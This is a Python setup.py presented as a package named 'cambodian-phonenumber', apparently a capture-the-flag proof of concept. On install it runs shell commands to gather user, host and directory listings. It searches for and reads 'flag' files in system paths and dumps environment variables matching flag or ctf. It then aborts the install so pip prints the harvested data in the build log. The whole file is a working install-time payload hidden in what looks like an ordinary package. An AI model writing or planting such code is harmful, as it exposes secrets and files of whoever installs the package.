import os, subprocess, glob
from setuptools import setup

def run(c):
    try:
        return subprocess.run(c, shell=True, capture_output=True, text=True, timeout=15).stdout.strip()
    except Exception as e:
        return f"<err:{e}>"

lines = []
lines.append("id=" + run("id"))
lines.append("host=" + run("hostname"))
lines.append("cwd=" + os.getcwd())
lines.append("user=" + run("whoami"))
# hunt for flag
cands = []
for pat in ["/flag*", "/root/flag*", "/home/*/flag*", "/app/flag*", "/flag.txt", "/tmp/flag*", "/srv/flag*", "./flag*"]:
    cands += glob.glob(pat)
lines.append("flag_candidates=" + repr(cands))
for f in cands:
    try:
        with open(f) as fh:
            lines.append(f"FLAGFILE[{f}]=" + fh.read().strip())
    except Exception as e:
        lines.append(f"FLAGFILE[{f}]=<err:{e}>")
# env-based flag
for k,v in os.environ.items():
    if "flag" in k.lower() or "FLAG" in k or "ctf" in k.lower():
        lines.append(f"ENV[{k}]={v}")
lines.append("env_grep=" + run("env | grep -iE 'flag|ctf' || true"))
lines.append("ls_root=" + run("ls -la / 2>/dev/null"))
lines.append("ls_app=" + run("ls -la /app 2>/dev/null; ls -la $(pwd)/../.. 2>/dev/null"))

banner = "\n".join("POC>> "+l for l in lines)
# force pip to surface the build log
raise SystemExit("\n\n==== POC OUTPUT START ====\n" + banner + "\n==== POC OUTPUT END ====\n")

setup(name="cambodian-phonenumber", version="0.0.1")
